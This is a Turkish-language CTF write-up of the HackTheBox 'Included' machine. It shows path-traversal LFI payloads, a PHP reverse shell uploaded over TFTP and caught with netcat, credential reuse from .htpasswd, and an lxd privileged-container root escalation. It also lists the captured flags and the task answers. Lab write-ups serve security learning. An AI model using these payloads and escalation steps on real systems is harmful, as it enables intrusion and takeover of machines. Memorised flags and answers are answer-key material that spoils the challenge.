# HackTheBox — Included Writeup

**Zorluk:** Easy
**İşletim Sistemi:** Linux
**Hedef IP:** 10.129.95.185
**Saldırgan IP:** 10.10.14.156

---

## 1. Keşif (Reconnaissance)

Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum:

```bash
nmap -sS -A -p- -T5 10.129.95.185
```

**Çıktı:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
```

TCP tarafında tek bir port açık: **80/tcp**, üzerinde Apache 2.4.29 çalışıyor. Nmap'in verdiği yönlendirme bilgisi çok dikkat çekici:

```
Requested resource was http://10.129.95.185/?file=home.php
```

URL yapısına bakıldığında `?file=` parametresiyle sunucu tarafında bir dosya çağırıldığı belli oluyor — bu, klasik bir **File Inclusion** zafiyeti şüphesi uyandırıyor.

---

## 2. Web Uygulamasının İncelenmesi — LFI Tespiti

Tarayıcıdan `http://10.129.95.185/?file=home.php` adresine gidiyorum. Sayfa, `file` parametresiyle verilen PHP dosyasını sunucu tarafında dahil edip (include) render ediyor gibi görünüyor. Bu davranışı doğrulamak için klasik bir **Local File Inclusion (LFI)** payload'ı deniyorum — dizin gezinme (`../`) karakterleriyle sunucudaki `/etc/passwd` dosyasını okumaya çalışıyorum:

```
http://10.129.95.185/?file=/../../../../../../etc/passwd
```

**Sonuç:** İstek başarılı, `/etc/passwd` dosyasının içeriği tarayıcıda görüntüleniyor. Bu, uygulamanın **Local File Inclusion (LFI)** zafiyetine sahip olduğunu kesin olarak doğruluyor — `file` parametresi hiçbir sanitizasyon veya whitelist kontrolüne tabi tutulmadan doğrudan `include()` fonksiyonuna veriliyor.

LFI'yi RCE'ye çevirmenin en klasik yöntemlerinden biri **log poisoning**'dir: Apache'nin erişim/hata log dosyalarına kötü amaçlı PHP kodu enjekte edip, ardından bu log dosyasını LFI ile dahil ederek kodu çalıştırmak. Bunun için Apache'nin varsayılan log dizinini deniyorum:

```
/var/log/apache2/access.log
```

Ancak bu dosyayı LFI üzerinden görüntüleyemiyorum — muhtemelen yetki kısıtlaması ya da farklı bir log yolu söz konusu. Bu yüzden alternatif bir vektöre yöneliyorum.

---

## 3. UDP Taraması — TFTP Servisinin Keşfi

Görev ipuçlarından birinde hedef makinede UDP üzerinden çalışan bir servisin sorulduğunu fark ediyorum. Şu ana kadar sadece TCP taraması yapmıştım; bu yüzden bir de UDP taraması çalıştırıyorum:

```bash
nmap -sU 10.129.95.185
```

**Çıktı:**

```
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
```

**TFTP (Trivial File Transfer Protocol)** servisinin açık olduğunu görüyorum. TFTP, kimlik doğrulaması olmayan, basit ve genellikle dikkatsizce yapılandırılan bir dosya transfer protokolü — LFI ile birleştiğinde çok güçlü bir kombinasyon oluşturabilir: TFTP üzerinden sunucuya dosya yazabilir, LFI ile de o dosyayı çalıştırabilirim.

---

## 4. TFTP Üzerinden Dosya Yükleme ve LFI ile Kod Çalıştırma

Öncelikle basit bir PHP reverse shell dosyası (`reverse.php`) hazırlıyorum ve TFTP istemcisiyle sunucuya yüklüyorum:

```bash
tftp 10.129.95.185
tftp> put reverse.php
```

TFTP protokolü, yazma izni olduğu sürece dosyayı sunucunun varsayılan depolama dizinine kaydediyor. Daha önce okuduğum `/etc/passwd` çıktısında TFTP servisinin varsayılan dizinini zaten görmüştüm:

```
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

Yani yüklediğim dosya sunucuda `/var/lib/tftpboot/reverse.php` yolunda duruyor olmalı. Şimdi kendi makinemde bir Netcat listener açıyorum:

```bash
nc -lvnp 4444
```

Ardından LFI zafiyetini kullanarak bu dosyayı tarayıcı üzerinden çağırıyorum:

```
http://10.129.95.185/?file=/../../../../../../var/lib/tftpboot/reverse.php
```

**Sonuç:**

```
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.156] from (UNKNOWN) [10.129.95.185] 40488
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell'im geldi — **www-data** kullanıcısı olarak sisteme erişim sağladım. Bu, TFTP + LFI kombinasyonunun ne kadar tehlikeli olabileceğini net bir şekilde gösteriyor: kimlik doğrulaması olmayan bir dosya yazma servisi, kontrolsüz bir dosya dahil etme zafiyetiyle birleştiğinde doğrudan uzaktan kod çalıştırmaya (RCE) dönüşüyor.

---

## 5. Yanal Hareket — Mike Kullanıcısına Geçiş

`www-data` yetkisiyle sistemde gezinirken, web sunucusu kök dizininde ilginç bir dosyaya rastlıyorum:

```bash
cat .htpasswd
```

```
mike:Sheffield19
```

Bu, klasik bir Apache Basic Authentication kimlik bilgisi dosyası ve içinde açık bir kullanıcı adı/parola çifti var — tipik bir **yanal hareket (lateral movement)** fırsatı. Bu bilgiyle `mike` kullanıcısına geçiş yapıyorum:

```bash
su mike
# Password: Sheffield19
```

Başarılı bir şekilde `mike` kullanıcısı oluyorum. Home dizinine gidip user flag'i okuyorum:

```bash
cd /home/mike
cat user.txt
```

```
a56ef91d70cfbf2cdb8f454c006935a1
```

---

## 6. Privilege Escalation — LXD Grubu İstismarı

Root'a giden yolu bulmak için `mike` kullanıcısının hangi gruplara ait olduğunu kontrol ediyorum:

```bash
id
```

```
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

**`lxd`** grubunun bir üyesi olduğumu görüyorum. LXD (Linux Container Daemon), Canonical'ın konteyner yönetim sistemi ve bu grubun üyesi olmak — sudo yetkisi olmasa bile — genellikle doğrudan **root'a yükselme** anlamına gelir. Çünkü LXD, `security.privileged=true` bayrağıyla başlatılan bir konteynerin root kullanıcısını host'un root'una eşleyebiliyor.

HackTricks'teki LXD privilege escalation makalesinden bu tekniğin adımlarını inceliyorum:

> https://hacktricks.wiki/en/linux-hardening/user-information/interesting-groups-linux-pe/lxd-privilege-escalation.html

Yöntem özetle şu şekilde: küçük bir Linux dağıtımı (Alpine) imajı içeri aktarılıyor, `security.privileged=true` bayrağıyla ayrıcalıklı bir konteyner başlatılıyor ve host'un kök dosya sistemi bu konteynerin içine mount ediliyor. Konteyner içindeki root, host'un root'una eşlendiği için host dosya sistemine root yetkisiyle erişim sağlanmış oluyor.

### 6.1. Alpine imajının indirilmesi

Kendi makinemde bir HTTP sunucusu açıp önceden hazırlanmış küçük bir Alpine LXD imajını hedef makineye indiriyorum:

```bash
# Saldırgan makinede:
python3 -m http.server 8000

# Hedef makinede:
wget http://10.10.14.156:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

### 6.2. İmajın içeri aktarılması ve LXD'nin başlatılması

```bash
lxc image import ./alpine*.tar.gz --alias myimage
lxd init
```

`lxd init` sırasında gelen soruların çoğunda varsayılan (default) seçenekleri kabul ediyorum (Enter'a basarak) — clustering, storage pool, network yapılandırması gibi konularda özel bir gereksinim yok, sadece LXD servisinin ayağa kalkması yeterli.

### 6.3. Ayrıcalıklı konteynerin oluşturulması

```bash
lxc init myimage mycontainer -c security.privileged=true
```

Burada kritik nokta **`security.privileged=true`** bayrağı — bu ayar, konteyner içindeki root kullanıcısının host sistemdeki root ile aynı UID'yi (0) paylaşmasını sağlıyor, yani konteyner içinden host'a root olarak erişim mümkün hâle geliyor.

### 6.4. Host dosya sisteminin mount edilmesi

```bash
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

Bu komutla host'un kök dizini (`/`), konteynerin içine `/mnt/root` yoluna mount ediliyor.

### 6.5. Konteynerin başlatılması ve içine girilmesi

```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

```
~ # whoami
root
```

Konteyner içinde **root** olduğumu doğruluyorum. Şimdi mount ettiğim host dosya sistemine göz atıyorum:

```
/ # cd /mnt/root
/mnt/root # ls
bin  boot  cdrom  dev  etc  home  ...  root  ...
```

`/mnt/root` altında host'un tüm dosya sistemi görünüyor — çünkü konteynerin root'u, host'un root'una eşlendiği için burada hiçbir dosya izni beni durduramıyor.

---

## 7. Root Flag'in Ele Geçirilmesi

Host'un root kullanıcısının home dizinine gidiyorum:

```
/mnt/root # cd root
/mnt/root/root # ls
root.txt
```

```
/mnt/root/root # cat root.txt
c693d9c7499d9f572ee375d4c14c7bcf
```

Flag başarıyla elde edildi. 🎉

---

## 8. Özet — Atak Zinciri

1. Nmap taramasıyla sadece 80/tcp portunun (Apache 2.4.29) açık olduğu, `?file=` parametresi üzerinden dosya çağırıldığı tespit edildi.
2. `../` payload'larıyla `/etc/passwd` okunarak **Local File Inclusion (LFI)** zafiyeti doğrulandı.
3. Apache log poisoning denendi ancak log dosyalarına erişilemedi; bunun üzerine UDP taraması yapıldı ve **TFTP** servisi (69/udp) keşfedildi.
4. TFTP üzerinden `reverse.php` dosyası `/var/lib/tftpboot/` dizinine yüklendi.
5. LFI ile bu dosya çağrılarak `www-data` yetkisiyle reverse shell elde edildi.
6. Web kök dizininde bulunan `.htpasswd` dosyasından `mike:Sheffield19` kimlik bilgileri elde edildi ve `mike` kullanıcısına geçildi; user flag okundu.
7. `mike`'ın **lxd** grubunun üyesi olduğu tespit edildi.
8. Ayrıcalıklı (`security.privileged=true`) bir Alpine LXD konteyneri oluşturulup host'un kök dosya sistemi içine mount edildi.
9. Konteyner içinden host root diziniyle root flag okundu.

---

## 9. Görev Soruları ve Cevapları

**Görev 1 — Hedef makinede UDP üzerinden hangi servis çalışıyor?**
TFTP (Trivial File Transfer Protocol)

**Görev 2 — 80 numaralı portta barındırılan web sayfası hangi tür güvenlik açığına karşı savunmasızdır? Kısaltma yerine tam adını verin.**
Local File Inclusion

**Görev 3 — TFTP'nin dosyaları depolamak için kullandığı varsayılan sistem klasörü nedir?**
`/var/lib/tftpboot`

**Görev 4 — Web sunucusu klasöründe bulunan ve Yanal Hareket için kullanılabilecek ilginç dosya hangisidir?**
`.htpasswd`

**Kullanıcı Bayrağını Gönder — Mike kullanıcısının ana dizininde bulunan bayrağı gönderin.**
`a56ef91d70cfbf2cdb8f454c006935a1`

**Görev 6 — Kullanıcı Mike'ın üyesi olduğu ve ayrıcalık yükseltme amacıyla istismar edilebilecek grup hangisidir?**
lxd

**Task 7 — When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?**
Alpine

**Task 8 — What flag do we set to the container so that it has root privileges on the host system?**
`security.privileged=true`

**Task 9 — If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?**
`/mnt/root/root/root.txt`

**Kök Bayrağı Gönder — Submit the flag located in root's home directory.**
`c693d9c7499d9f572ee375d4c14c7bcf`

---

*Not: Bu writeup eğitim/CTF amaçlıdır. Tüm işlemler yalnızca HackTheBox'ın izin verdiği laboratuvar ortamında gerçekleştirilmiştir.*
